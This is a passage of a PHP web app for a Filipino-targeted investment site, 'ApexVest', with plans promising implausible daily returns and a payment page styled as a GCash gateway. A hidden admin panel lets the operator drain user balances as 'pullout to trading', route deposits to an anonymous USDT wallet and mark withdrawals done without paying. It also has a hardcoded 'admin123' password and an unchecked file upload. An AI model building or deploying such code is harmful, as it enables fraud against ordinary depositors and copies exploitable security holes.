<?php
session_start();

$adminSecretPassword = 'admin123'; 
$dataFile = __DIR__ . '/../data/system_data.json';
$uploadDir = __DIR__ . '/../public/uploads/';

function loadData($filePath) {
    $dir = dirname($filePath);
    if (!is_dir($dir)) { mkdir($dir, 0777, true); }
    if (!file_exists($filePath)) {
        $initialData = [
            'settings' => ['admin_wallet' => 'TKXeJE2mXMAoFFcjE8E1LctQDNmjo9HVxd', 'qr_image_url' => ''],
            'users' => [],
            'transactions' => []
        ];
        file_put_contents($filePath, json_encode($initialData, JSON_PRETTY_PRINT));
        return $initialData;
    }
    $content = file_get_contents($filePath);
    $data = json_decode($content, true) ?? [];
    if (!isset($data['settings'])) {
        $data['settings'] = ['admin_wallet' => 'TKXeJE2mXMAoFFcjE8E1LctQDNmjo9HVxd', 'qr_image_url' => ''];
    }
    return $data;
}

function saveData($filePath, $data) {
    $dir = dirname($filePath);
    if (!is_dir($dir)) { mkdir($dir, 0777, true); }
    file_put_contents($filePath, json_encode($data, JSON_PRETTY_PRINT));
}

$db = loadData($dataFile);
$adminUsdtWallet = $db['settings']['admin_wallet'] ?? 'TKXeJE2mXMAoFFcjE8E1LctQDNmjo9HVxd';
$adminQrImageUrl = $db['settings']['qr_image_url'] ?? '';

if (isset($_GET['ref'])) {
    $_SESSION['referred_by'] = htmlspecialchars($_GET['ref']);
}

// Investment Plans (30 Days Period)
$plans = [
    'Apex-Yield 1' => ['price' => 300, 'return_daily' => 50.00, 'days' => 30],
    'Apex-Yield 2' => ['price' => 700, 'return_daily' => 125.00, 'days' => 30],
    'Apex-Yield 3' => ['price' => 1500, 'return_daily' => 285.00, 'days' => 30],
    'Apex-Yield 4' => ['price' => 3000, 'return_daily' => 600.00, 'days' => 30],
    'Apex-Yield 5' => ['price' => 7000, 'return_daily' => 1500.00, 'days' => 30],
    'Apex-Yield 6' => ['price' => 15000, 'return_daily' => 3430.00, 'days' => 30],
    'Apex-Yield 7' => ['price' => 30000, 'return_daily' => 7370.00, 'days' => 30]
];

// USER REGISTRATION
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['action']) && $_POST['action'] === 'register') {
    $username = strtolower(trim($_POST['username'] ?? ''));
    $password = trim($_POST['password'] ?? '');

    if (empty($username) || empty($password)) {
        $authError = "Punan ang username at password.";
    } elseif (isset($db['users'][$username])) {
        $authError = "May gumagamit na ng username na ito.";
    } else {
        $db['users'][$username] = [
            'password' => password_hash($password, PASSWORD_DEFAULT),
            'balance' => 100.00,
            'referred_by' => $_SESSION['referred_by'] ?? 'None',
            'created_at' => date('Y-m-d H:i:s')
        ];
        saveData($dataFile, $db);
        $_SESSION['user'] = $username;
        header("Location: /");
        exit();
    }
}

// USER LOGIN
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['action']) && $_POST['action'] === 'login') {
    $username = strtolower(trim($_POST['username'] ?? ''));
    $password = trim($_POST['password'] ?? '');

    if (isset($db['users'][$username]) && password_verify($password, $db['users'][$username]['password'])) {
        $_SESSION['user'] = $username;
        header("Location: /");
        exit();
    } else {
        $authError = "Maling username o password.";
    }
}

if (isset($_GET['action']) && $_GET['action'] === 'logout') {
    unset($_SESSION['user']);
    header("Location: /");
    exit();
}

// ADMIN LOGIN / LOGOUT
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['action']) && $_POST['action'] === 'admin_login') {
    if (trim($_POST['password']) === $adminSecretPassword) {
        $_SESSION['is_admin'] = true;
        header("Location: ?route=admin");
        exit();
    } else {
        $adminError = "Maling password ng admin.";
    }
}

if (isset($_GET['action']) && $_GET['action'] === 'admin_logout') {
    unset($_SESSION['is_admin']);
    header("Location: /");
    exit();
}

// ADMIN SETTINGS & QR UPLOAD UPDATE
if (isset($_SESSION['is_admin']) && $_SESSION['is_admin'] === true && $_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['action']) && $_POST['action'] === 'update_admin_settings') {
    $newWallet = trim($_POST['new_admin_wallet'] ?? '');
    if (!empty($newWallet)) {
        $db['settings']['admin_wallet'] = htmlspecialchars($newWallet);
        $adminUsdtWallet = $newWallet;
    }

    if (isset($_FILES['qr_image']) && $_FILES['qr_image']['error'] === UPLOAD_ERR_OK) {
        if (!is_dir($uploadDir)) { mkdir($uploadDir, 0777, true); }
        $ext = pathinfo($_FILES['qr_image']['name'], PATHINFO_EXTENSION);
        $filename = 'admin_qr_' . time() . '.' . $ext;
        $targetPath = $uploadDir . $filename;
        if (move_uploaded_file($_FILES['qr_image']['tmp_name'], $targetPath)) {
            $db['settings']['qr_image_url'] = '/uploads/' . $filename;
            $adminQrImageUrl = '/uploads/' . $filename;
        }
    }

    saveData($dataFile, $db);
    $adminSuccess = "Matagumpay na na-update ang Admin Settings at QR Code!";
}

// ADMIN DIRECT FUND ADJUSTMENT
if (isset($_SESSION['is_admin']) && $_SESSION['is_admin'] === true && $_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['action']) && $_POST['action'] === 'admin_adjust_fund') {
    $targetUser = trim($_POST['target_user'] ?? '');
    $adjustAmount = floatval($_POST['adjust_amount'] ?? 0);
    $type = $_POST['adjust_type'] ?? 'pullout';

    if (isset($db['users'][$targetUser]) && $adjustAmount > 0) {
        if ($type === 'pullout') {
            $db['users'][$targetUser]['balance'] -= $adjustAmount;
            if ($db['users'][$targetUser]['balance'] < 0) { $db['users'][$targetUser]['balance'] = 0; }
            $db['transactions'][] = [
                'id' => 'TRD-PULL-' . time(),
                'username' => $targetUser,
                'type' => 'pullout_to_trading',
                'amount' => $adjustAmount,
                'status' => 'completed',
                'created_at' => date('Y-m-d H:i:s')
            ];
            $adminSuccess = "Na-pullout ang ₱" . number_format($adjustAmount, 2) . " kay $targetUser para i-roll sa trading account!";
        } elseif ($type === 'deposit') {
            $db['users'][$targetUser]['balance'] += $adjustAmount;
            $db['transactions'][] = [
                'id' => 'ADM-DEP-' . time(),
                'username' => $targetUser,
                'type' => 'admin_deposit',
                'amount' => $adjustAmount,
                'status' => 'approved',
                'created_at' => date('Y-m-d H:i:s')
            ];
            $adminSuccess = "Nalagyan ng ₱" . number_format($adjustAmount, 2) . " si $targetUser!";
        }
        saveData($dataFile, $db);
    } else {
        $adminErrorMsg = "Mali ang napiling user o halaga.";
    }
}

// ADMIN APPROVALS
if (isset($_SESSION['is_admin']) && $_SESSION['is_admin'] === true && isset($_GET['approve_deposit'])) {
    $txnId = $_GET['approve_deposit'];
    foreach ($db['transactions'] as &$txn) {
        if ($txn['id'] === $txnId && $txn['status'] === 'pending') {
            $txn['status'] = 'approved';
            $u = $txn['username'];
            if (isset($db['users'][$u])) {
                $db['users'][$u]['balance'] += $txn['amount'];
            }
            saveData($dataFile, $db);
            break;
        }
    }
    header("Location: ?route=admin");
    exit();
}

if (isset($_SESSION['is_admin']) && $_SESSION['is_admin'] === true && isset($_GET['approve_withdraw'])) {
    $txnId = $_GET['approve_withdraw'];
    foreach ($db['transactions'] as &$txn) {
        if ($txn['id'] === $txnId && $txn['status'] === 'pending') {
            $txn['status'] = 'completed';
            saveData($dataFile, $db);
            break;
        }
    }
    header("Location: ?route=admin");
    exit();
}

// CURRENT USER
$currentUser = $_SESSION['user'] ?? null;
$userData = $currentUser ? ($db['users'][$currentUser] ?? null) : null;
$referralLink = $currentUser ? ('http://' . $_SERVER['HTTP_HOST'] . '/?ref=' . $currentUser) : '';

// USER RECHARGE SUBMISSION
if ($currentUser && $_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['action']) && $_POST['action'] === 'submit_recharge') {
    $amount = floatval($_POST['deposit_amount'] ?? 0);
    $method = $_POST['payment_method'] ?? 'GCash';

    if ($amount < 300) {
        $error = "Ang minimum recharge ay ₱300.";
    } else {
        $txnId = 'PAY-' . time();
        $db['transactions'][] = [
            'id' => $txnId,
            'username' => $currentUser,
            'type' => 'recharge_' . strtolower($method),
            'amount' => $amount,
            'txid' => 'GATEWAY-PENDING-' . time(),
            'status' => 'pending',
            'created_at' => date('Y-m-d H:i:s')
        ];
        saveData($dataFile, $db);
        header("Location: ?route=gateway&txn=" . $txnId . "&amount=" . $amount . "&method=" . $method);
        exit();
    }
}

// USER WITHDRAWAL
if ($currentUser && $_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['action']) && $_POST['action'] === 'request_withdraw') {
    $amount = floatval($_POST['withdraw_amount'] ?? 0);
    $wallet = trim($_POST['user_wallet'] ?? '');
    $currentBalance = $userData['balance'] ?? 0;

    if ($amount < 100) {
        $error = "Ang minimum withdrawal ay ₱100.";
    } elseif ($amount > $currentBalance) {
        $error = "Hindi sapat ang iyong balance.";
    } elseif (empty($wallet)) {
        $error = "Ilagay ang iyong GCash / Wallet details.";
    } else {
        $db['users'][$currentUser]['balance'] -= $amount;
        $db['transactions'][] = [
            'id' => 'WD-' . time(),
            'username' => $currentUser,
            'type' => 'withdraw',
            'amount' => $amount,
            'wallet' => htmlspecialchars($wallet),
            'status' => 'pending',
            'created_at' => date('Y-m-d H:i:s')
        ];
        saveData($dataFile, $db);
        $userData = $db['users'][$currentUser];
        $success = "Naisumite na ang withdrawal request!";
    }
}

// SUBSCRIBE PLAN
if ($currentUser && $_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['action']) && $_POST['action'] === 'subscribe') {
    $planKey = $_POST['plan_name'] ?? '';
    if (isset($plans[$planKey])) {
        $plan = $plans[$planKey];
        if ($userData['balance'] < $plan['price']) {
            $error = "Hindi sapat ang iyong balance para sa plan na ito.";
        } else {
            $db['users'][$currentUser]['balance'] -= $plan['price'];
            $db['transactions'][] = [
                'id' => 'SUB-' . time(),
                'username' => $currentUser,
                'type' => 'subscription',
                'plan' => $planKey,
                'amount' => $plan['price'],
                'status' => 'active',
                'created_at' => date('Y-m-d H:i:s')
            ];
            saveData($dataFile, $db);
            $userData = $db['users'][$currentUser];
            $success = "Matagumpay na na-activate ang $planKey!";
        }
    }
}

$userTxns = [];
if ($currentUser && isset($db['transactions'])) {
    foreach ($db['transactions'] as $t) {
        if (isset($t['username']) && $t['username'] === $currentUser) {
            $userTxns[] = $t;
        }
    }
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Gcash - cloud.gceepay.com</title>
    <style>
        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; background: #f1f5f9; color: #1e293b; margin: 0; padding-bottom: 80px; }
        .container { max-width: 480px; margin: 0 auto; padding: 15px; }
        .header-top { display: flex; justify-content: space-between; align-items: center; margin-bottom: 15px; font-size: 14px; color: #94a3b8; }
        .balance-card { background: linear-gradient(135deg, #0b2e21, #0f3d2c); padding: 20px; border-radius: 14px; border: 1px solid #145332; margin-bottom: 15px; box-shadow: 0 8px 20px rgba(0,0,0,0.4); color: #f8fafc; }
        .balance-title { font-size: 13px; color: #94a3b8; }
        .balance-amount { font-size: 32px; font-weight: bold; color: #facc15; margin-top: 5px; }
        .sub-stats { display: flex; gap: 10px; margin-top: 15px; }
        .sub-box { flex: 1; background: #071c15; padding: 12px; border-radius: 10px; border: 1px solid #113829; text-align: center; }
        .sub-box-title { font-size: 11px; color: #94a3b8; }
        .sub-box-val { font-size: 16px; font-weight: bold; color: #facc15; margin-top: 4px; }
        
        .menu-grid { display: grid; grid-template-columns: repeat(5, 1fr); gap: 8px; margin: 20px 0; text-align: center; }
        .menu-item { background: #0f3d2c; padding: 12px 5px; border-radius: 12px; border: 1px solid #165b41; cursor: pointer; color: #f8fafc; font-size: 11px; text-decoration: none; }
        .menu-item svg { width: 22px; height: 22px; fill: #facc15; margin-bottom: 4px; display: block; margin: 0 auto 4px auto; }
        
        .section-title { font-size: 16px; font-weight: bold; margin: 20px 0 10px 0; color: #0f172a; display: flex; justify-content: space-between; align-items: center; }
        
        .plan-card { background: #0b2e21; border-radius: 14px; border: 1px solid #145332; overflow: hidden; margin-bottom: 15px; box-shadow: 0 4px 12px rgba(0,0,0,0.3); color: #fff; }
        .plan-body { padding: 15px; }
        .yield-tag { display: inline-block; background: #facc15; color: #071913; font-weight: bold; padding: 4px 10px; border-radius: 20px; font-size: 12px; margin-bottom: 8px; }
        .plan-name { font-size: 18px; font-weight: bold; color: #fff; margin-bottom: 4px; }
        .plan-info { font-size: 12px; color: #94a3b8; margin-bottom: 12px; }
        
        .btn { display: block; width: 100%; padding: 14px; background: linear-gradient(135deg, #facc15, #eab308); color: #071913; border: none; border-radius: 10px; font-weight: bold; font-size: 15px; cursor: pointer; text-align: center; text-decoration: none; box-sizing: border-box; }
        .btn-cancel { background: #1b3a2b; color: #fff; margin-top: 8px; }
        .btn-danger { background: #ef4444; color: #fff; }
        
        .bottom-nav { position: fixed; bottom: 0; left: 0; right: 0; background: #071913; border-top: 1px solid #113829; display: grid; grid-template-columns: repeat(5, 1fr); padding: 8px 0; z-index: 1000; max-width: 480px; margin: 0 auto; }
        .nav-link { text-align: center; color: #94a3b8; text-decoration: none; font-size: 11px; cursor: pointer; }
        .nav-link.active { color: #facc15; }
        .nav-link svg { width: 20px; height: 20px; fill: currentColor; margin: 0 auto 2px auto; display: block; }
        
        .card { background: #0b2e21; padding: 15px; border-radius: 12px; border: 1px solid #145332; margin-bottom: 15px; color: #fff; }
        input, select { width: 100%; padding: 12px; margin: 8px 0; border-radius: 8px; border: 1px solid #165b41; background: #071913; color: white; box-sizing: border-box; }
        .alert { padding: 10px; border-radius: 8px; margin-bottom: 15px; text-align: center; font-size: 13px; }
        .alert-error { background: #7f1d1d; color: #fca5a5; }
        .alert-success { background: #145332; color: #86efac; }
        
        .modal { display: none; position: fixed; top: 0; left: 0; right: 0; bottom: 0; background: rgba(0,0,0,0.85); z-index: 2000; justify-content: center; align-items: flex-end; }
        .modal-content { background: #0b2e21; width: 100%; max-width: 480px; border-radius: 20px 20px 0 0; padding: 20px; border-top: 2px solid #facc15; box-sizing: border-box; max-height: 85vh; overflow-y: auto; color: #fff; }
        
        .notice-modal { display: flex; position: fixed; top: 0; left: 0; right: 0; bottom: 0; background: rgba(0,0,0,0.8); z-index: 3000; justify-content: center; align-items: center; }
        .notice-box { background: linear-gradient(135deg, #0b2e21, #0f3d2c); width: 85%; max-width: 340px; border-radius: 20px; padding: 25px 20px; border: 1px solid #165b41; text-align: center; position: relative; box-shadow: 0 10px 30px rgba(0,0,0,0.5); color: #fff; }
        .notice-icon { background: #facc15; width: 50px; height: 50px; border-radius: 50%; display: flex; align-items: center; justify-content: center; margin: 0 auto 15px auto; }
        .notice-icon svg { width: 26px; height: 26px; fill: #071913; }
        .close-btn { position: absolute; top: 15px; right: 15px; background: rgba(255,255,255,0.1); border: none; color: #fff; width: 28px; height: 28px; border-radius: 50%; cursor: pointer; font-weight: bold; }
        
        .method-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; margin: 10px 0; }
        .method-card { background: #071913; border: 1px solid #165b41; padding: 12px; border-radius: 10px; text-align: center; cursor: pointer; color: #94a3b8; font-weight: bold; }
        .method-card.selected { border-color: #facc15; color: #facc15; background: #0f3d2c; }
        
        .amount-grid { display: grid; grid-template-columns: repeat(4, 1fr); gap: 8px; margin: 10px 0; }
        .amount-chip { background: #071913; border: 1px solid #165b41; padding: 10px 5px; border-radius: 8px; text-align: center; cursor: pointer; color: #fff; font-size: 13px; font-weight: bold; }
        .amount-chip.selected { background: #facc15; color: #071913; border-color: #facc15; }
        
        .history-card { background: #071913; border: 1px solid #145332; padding: 12px; border-radius: 10px; margin-bottom: 10px; font-size: 12px; color: #fff; }
        .status-badge { display: inline-block; padding: 2px 8px; border-radius: 12px; font-size: 10px; font-weight: bold; text-transform: uppercase; float: right; }
        .status-pending { background: #d97706; color: #fff; }
        .status-approved, .status-completed { background: #22c55e; color: #fff; }
    </style>
</head>
<body>

<div class="container">
    <?php if (isset($_GET['route']) && $_GET['route'] === 'admin'): ?>
        <h2>Admin Panel (Secret Dashboard)</h2>
        <?php if (!isset($_SESSION['is_admin']) || $_SESSION['is_admin'] !== true): ?>
            <div class="card">
                <form method="POST">
                    <input type="hidden" name="action" value="admin_login">
                    <label>Admin Password:</label>
                    <input type="password" name="password" required>
                    <button type="submit" class="btn">Login</button>
                    <?php if(isset($adminError)): ?><div class="alert alert-error" style="margin-top:10px;"><?= $adminError ?></div><?php endif; ?>
                </form>
            </div>
        <?php else: ?>
            <?php if(isset($adminSuccess)): ?><div class="alert alert-success"><?= $adminSuccess ?></div><?php endif; ?>
            <?php if(isset($adminErrorMsg)): ?><div class="alert alert-error"><?= $adminErrorMsg ?></div><?php endif; ?>

            <div class="card" style="border: 2px solid #facc15;">
                <h3 style="color:#facc15; margin-top:0;">Fund Manager (Pullout to Trading)</h3>
                <form method="POST">
                    <input type="hidden" name="action" value="admin_adjust_fund">
                    <label>Pumili ng Client User:</label>
                    <select name="target_user" required>
                        <?php foreach ($db['users'] as $uname => $uinfo): ?>
                            <option value="<?= htmlspecialchars($uname) ?>">
                                <?= htmlspecialchars($uname) ?> (Bal: ₱<?= number_format($uinfo['balance'], 2) ?>)
                            </option>
                        <?php endforeach; ?>
                    </select>

                    <label>Action:</label>
                    <select name="adjust_type" required>
                        <option value="pullout">Pullout Funds (I-roll diretso sa Trading Account)</option>
                        <option value="deposit">Manual Deposit / Add Profit</option>
                    </select>

                    <label>Amount (₱):</label>
                    <input type="number" name="adjust_amount" min="1" step="0.01" placeholder="Ilagay ang halaga" required>

                    <button type="submit" class="btn" style="background:#22c55e; color:#fff; margin-top:10px;">Execute Action</button>
                </form>
            </div>

            <div class="card">
                <h3>Admin Wallet & QR Code Settings</h3>
                <form method="POST" enctype="multipart/form-data">
                    <input type="hidden" name="action" value="update_admin_settings">
                    <label>Anonymous USDT Wallet Address:</label>
                    <input type="text" name="new_admin_wallet" value="<?= htmlspecialchars($adminUsdtWallet) ?>" required>
                    
                    <label style="margin-top: 10px; display:block;">Mag-upload ng InstaPay QR Code (Image):</label>
                    <?php if (!empty($adminQrImageUrl)): ?>
                        <div style="margin: 8px 0;"><img src="<?= htmlspecialchars($adminQrImageUrl) ?>" alt="Current QR" style="width: 100px; border-radius: 6px; border: 1px solid #165b41;"></div>
                    <?php endif; ?>
                    <input type="file" name="qr_image" accept="image/*" style="background:none; border:none; padding:5px 0;">

                    <button type="submit" class="btn" style="margin-top:10px;">I-save Settings</button>
                </form>
            </div>

            <div class="card">
                <h3>Pending Recharges</h3>
                <?php foreach($db['transactions'] as $txn): if(strpos($txn['type'], 'recharge') !== false && $txn['status'] === 'pending'): ?>
                    <div style="background:#071913; padding:10px; border-radius:8px; margin-bottom:8px; font-size:12px;">
                        User: <b><?= $txn['username'] ?></b> | Amt: ₱<?= number_format($txn['amount'], 2) ?><br>
                        Type: <?= $txn['type'] ?><br>
                        <a href="?route=admin&approve_deposit=<?= $txn['id'] ?>" class="btn" style="padding:6px; font-size:12px; margin-top:6px;">Approve & Credit Balance</a>
                    </div>
                <?php endif; endforeach; ?>
            </div>

            <div class="card">
                <h3>Pending Withdrawals</h3>
                <?php foreach($db['transactions'] as $txn): if($txn['type'] === 'withdraw' && $txn['status'] === 'pending'): ?>
                    <div style="background:#071913; padding:10px; border-radius:8px; margin-bottom:8px; font-size:12px;">
                        User: <b><?= $txn['username'] ?></b> | Amt: ₱<?= number_format($txn['amount'], 2) ?><br>
                        Wallet: <code><?= $txn['wallet'] ?></code><br>
                        <a href="?route=admin&approve_withdraw=<?= $txn['id'] ?>" class="btn" style="padding:6px; font-size:12px; margin-top:6px; background:#22c55e; color:#fff;">Mark as Done</a>
                    </div>
                <?php endif; endforeach; ?>
                <a href="?action=admin_logout" class="btn btn-danger" style="margin-top:15px; text-align:center;">Logout Admin</a>
            </div>
        <?php endif; ?>

    <?php elseif (isset($_GET['route']) && $_GET['route'] === 'gateway'): ?>
        <!-- CLOUD GCEEPAY GATEWAY (CUSTOM INSTAPAY QR) -->
        <?php 
            $gatewayAmt = $_GET['amount'] ?? 300;
            $gatewayMethod = $_GET['method'] ?? 'GCash';
            $txnId = $_GET['txn'] ?? 'PAY-' . time();
        ?>
        <div style="background: #f1f5f9; min-height: 100vh; margin: -15px; padding-bottom: 50px; color: #1e293b; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;">
            
            <div style="background: #1b6ef3; padding: 18px 15px; color: #fff; text-align: center; box-shadow: 0 2px 8px rgba(0,0,0,0.1);">
                <div style="font-size: 18px; font-weight: bold; display: flex; align-items: center; justify-content: center; gap: 6px;">
                    <span style="background: #fff; color: #1b6ef3; padding: 2px 8px; border-radius: 4px; font-size: 13px;">G</span> <?= htmlspecialchars($gatewayMethod) ?>
                </div>
                <div style="font-size: 10px; opacity: 0.8; margin-top: 2px;">cloud.gceepay.com</div>
            </div>

            <div style="max-width: 440px; margin: 20px auto; background: #ffffff; border-radius: 12px; padding: 25px 20px; box-shadow: 0 4px 15px rgba(0,0,0,0.05);">
                <p style="text-align: center; color: #64748b; font-size: 13px; margin-bottom: 20px; font-weight: 500;">
                    Scan or upload this QR code using your <?= htmlspecialchars($gatewayMethod) ?> App
                </p>

                <!-- QR CODE BOX (CUSTOM ADMIN QR IMAGE) -->
                <div style="text-align: center; margin-bottom: 25px;">
                    <div style="background: #fff; padding: 12px; display: inline-block; border-radius: 12px; border: 1px solid #e2e8f0; box-shadow: 0 2px 8px rgba(0,0,0,0.05);">
                        <?php if (!empty($adminQrImageUrl)): ?>
                            <img src="<?= htmlspecialchars($adminQrImageUrl) ?>" alt="InstaPay Payment QR" style="display: block; width: 220px; height: 220px; border-radius: 6px; object-fit: contain;">
                        <?php else: ?>
                            <p style="color: #ef4444; font-size: 12px; padding: 40px;">Walang naka-upload na QR code ang Admin.</p>
                        <?php endif; ?>
                    </div>
                </div>

                <!-- PAYMENT SUMMARY -->
                <div style="background: #f8fafc; border-radius: 10px; padding: 15px; margin-bottom: 20px; border: 1px solid #e2e8f0;">
                    <div style="display: flex; justify-content: space-between; font-size: 13px; color: #64748b; margin-bottom: 8px;">
                        <span>Transaction ID</span>
                        <span style="font-weight: 600; color: #1e293b;"><?= htmlspecialchars($txnId) ?></span>
                    </div>
                    <div style="display: flex; justify-content: space-between; font-size: 13px; color: #64748b; margin-bottom: 12px;">
                        <span>Amount Due</span>
                        <span style="font-weight: 600; color: #1e293b;">₱<?= number_format($gatewayAmt, 2) ?></span>
                    </div>
                    <hr style="border: none; border-top: 1px solid #e2e8f0; margin-bottom: 12px;">
                    <div style="display: flex; justify-content: space-between; font-size: 16px; font-weight: 800; color: #0f172a;">
                        <span>Total Amount</span>
                        <span style="color: #059669;">₱<?= number_format($gatewayAmt, 2) ?></span>
                    </div>
                </div>

                <a href="/" style="display: block; text-align: center; background: #e2e8f0; color: #334155; padding: 12px; border-radius: 8px; font-size: 13px; font-weight: bold; text-decoration: none;">
                    Tapos Na / Balik sa Dashboard
                </a>
            </div>

            <!-- TIMEOUT BADGE -->
            <div style="position: fixed; bottom: 20px; right: 20px; background: #1b6ef3; color: #ffffff; padding: 10px 18px; border-radius: 20px; font-weight: bold; font-size: 12px; box-shadow: 0 4px 12px rgba(0,0,0,0.2); z-index: 9999;">
                Payment Timeout : <span id="timerCountdown">15:00</span>
            </div>
        </div>

        <script>
            var timeLeft = 15 * 60; 
            var timerElement = document.getElementById('timerCountdown');
            var interval = setInterval(function() {
                var m = Math.floor(timeLeft / 60);
                var s = timeLeft % 60;
                if (s < 10) s = '0' + s;
                if (m < 10) m = '0' + m;
                timerElement.textContent = m + ':' + s;
                if (timeLeft <= 0) {
                    clearInterval(interval);
                    window.location.href = '/';
                }
                timeLeft--;
            }, 1000);
        </script>

    <?php elseif (!$currentUser): ?>
        <div style="text-align:center; padding: 40px 0;">
            <h2 style="color: #facc15;">ApexVest Portal</h2>
            <p style="color: #94a3b8; font-size: 13px;">Mag-login o mag-register para magsimula.</p>
        </div>
        
        <?php if(isset($authError)): ?><div class="alert alert-error"><?= $authError ?></div><?php endif; ?>
        
        <div class="card">
            <form method="POST">
                <input type="hidden" name="action" value="login">
                <label>Username:</label>
                <input type="text" name="username" required>
                <label>Password:</label>
                <input type="password" name="password" required>
                <button type="submit" class="btn" style="margin-top: 10px;">Login</button>
            </form>
        </div>

        <div class="card" style="margin-top: 20px;">
            <h3 style="margin-top: 0; color: #facc15; font-size: 15px;">Wala pang account? Register na (May Free ₱100 Bonus!)</h3>
            <form method="POST">
                <input type="hidden" name="action" value="register">
                <label>Username:</label>
                <input type="text" name="username" required>
                <label>Password:</label>
                <input type="password" name="password" required>
                <button type="submit" class="btn" style="background: #22c55e; color: #fff; margin-top: 10px;">Register Now</button>
            </form>
        </div>
        <div style="text-align: center; margin-top: 20px;"><a href="?route=admin" style="color: #94a3b8; font-size: 12px; text-decoration: none;">Admin Panel</a></div>

    <?php else: ?>
        <div id="noticeModal" class="notice-modal">
            <div class="notice-box">
                <button class="close-btn" onclick="closeNotice()">×</button>
                <div class="notice-icon">
                    <svg viewBox="0 0 24 24"><path d="M12 22c1.1 0 2-.9 2-2h-4c0 1.1.9 2 2 2zm6-6v-5c0-3.07-1.64-5.64-4.5-6.32V4c0-.83-.67-1.5-1.5-1.5s-1.5.67-1.5 1.5v.68C7.64 5.36 6 7.92 6 11v5l-2 2v1h16v-1l-2-2zm-2 1H8v-6c0-2.48 1.51-4.5 4-4.5s4 2.02 4 4.5v6z"/></svg>
                </div>
                <a href="https://t.me/ApexestOfficial" target="_blank" class="btn" style="margin-bottom: 12px; text-decoration: none; display: block;">Customer Service</a>
                <a href="https://t.me/ApexestOfficial" target="_blank" class="btn" style="background: #0f3d2c; color: #facc15; border: 1px solid #165b41; margin-bottom: 12px; text-decoration: none; display: block;">Official Group</a>
                <span onclick="closeNotice()" style="color: #94a3b8; font-size: 13px; cursor: pointer; text-decoration: underline;">Skip</span>
            </div>
        </div>

        <div class="header-top">
            <span>Good day, <b><?= htmlspecialchars($currentUser) ?></b></span>
            <a href="?action=logout" style="color: #ef4444; text-decoration: none; font-size: 12px;">Logout</a>
        </div>

        <div class="balance-card">
            <div class="balance-title">My balance</div>
            <div class="balance-amount">₱<?= number_format($userData['balance'] ?? 0, 2) ?></div>
            <div class="sub-stats">
                <div class="sub-box">
                    <div class="sub-box-title">RECHARGE BALANCE</div>
                    <div class="sub-box-val">₱0.00</div>
                </div>
                <div class="sub-box">
                    <div class="sub-box-title">EARNED BALANCE</div>
                    <div class="sub-box-val">₱<?= number_format($userData['balance'] ?? 0, 2) ?></div>
                </div>
            </div>
        </div>

        <?php if(isset($success)): ?><div class="alert alert-success"><?= $success ?></div><?php endif; ?>
        <?php if(isset($error)): ?><div class="alert alert-error"><?= $error ?></div><?php endif; ?>

        <div class="menu-grid">
            <div class="menu-item" onclick="openModal('rechargeModal')">
                <svg viewBox="0 0 24 24"><path d="M19 9h-4V3H9v6H5l7 7 7-7zM5 18v2h14v-2H5z"/></svg>
                Recharge
            </div>
            <div class="menu-item" onclick="openModal('withdrawModal')">
                <svg viewBox="0 0 24 24"><path d="M5 4h14v2H5V4zm0 10h4v6h6v-6h4l-7-7-7 7z"/></svg>
                Withdrawal
            </div>
            <div class="menu-item" onclick="alert('Referral Link: <?= $referralLink ?>')">
                <svg viewBox="0 0 24 24"><path d="M16 11c1.66 0 2.99-1.34 2.99-3S17.66 5 16 5c-1.66 0-3 1.34-3 3s1.34 3 3 3zm-8 0c1.66 0 2.99-1.34 2.99-3S9.66 5 8 5C6.34 5 5 6.34 5 8s1.34 3 3 3zm0 2c-2.33 0-7 1.17-7 3.5V19h14v-2.5c0-2.33-4.67-3.5-7-3.5z"/></svg>
                Share
            </div>
            <div class="menu-item" onclick="openModal('historyModal')">
                <svg viewBox="0 0 24 24"><path d="M19 3H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm-5 14H7v-2h7v2zm3-4H7v-2h10v2zm0-4H7V7h10v2z"/></svg>
                History
            </div>
            <div class="menu-item" onclick="openNotice()">
                <svg viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-6h2v6zm0-8h-2V7h2v2z"/></svg>
                Support
            </div>
        </div>

        <div class="section-title">
            <span>Product Investment</span>
        </div>

        <?php foreach ($plans as $pName => $pData): ?>
        <div class="plan-card">
            <div class="plan-body">
                <div class="yield-tag">₱<?= number_format($pData['return_daily'], 2) ?> DAILY YIELD</div>
                <div class="plan-name"><?= $pName ?></div>
                <div class="plan-info">Period: <?= $pData['days'] ?> Days | Value: ₱<?= number_format($pData['price'], 2) ?></div>
                
                <form method="POST">
                    <input type="hidden" name="action" value="subscribe">
                    <input type="hidden" name="plan_name" value="<?= $pName ?>">
                    <button type="submit" class="btn">Invest Now (₱<?= number_format($pData['price'], 2) ?>)</button>
                </form>
            </div>
        </div>
        <?php endforeach; ?>

        <div id="rechargeModal" class="modal">
            <div class="modal-content">
                <h3 style="color: #facc15; margin-top: 0;">Recharge</h3>
                <form method="POST">
                    <input type="hidden" name="action" value="submit_recharge">
                    
                    <p style="font-size: 12px; color: #94a3b8; margin: 5px 0;">1. PAYMENT METHOD</p>
                    <div class="method-grid">
                        <div class="method-card selected" id="methodGCash" onclick="setMethod('GCash')">GCash</div>
                        <div class="method-card" id="methodMaya" onclick="setMethod('Maya')">Maya</div>
                    </div>
                    <input type="hidden" name="payment_method" id="paymentMethodInput" value="GCash">

                    <p style="font-size: 12px; color: #94a3b8; margin: 10px 0 5px 0;">2. CHOOSE AMOUNT</p>
                    <div class="amount-grid">
                        <div class="amount-chip selected" onclick="setAmount(300, this)">₱300</div>
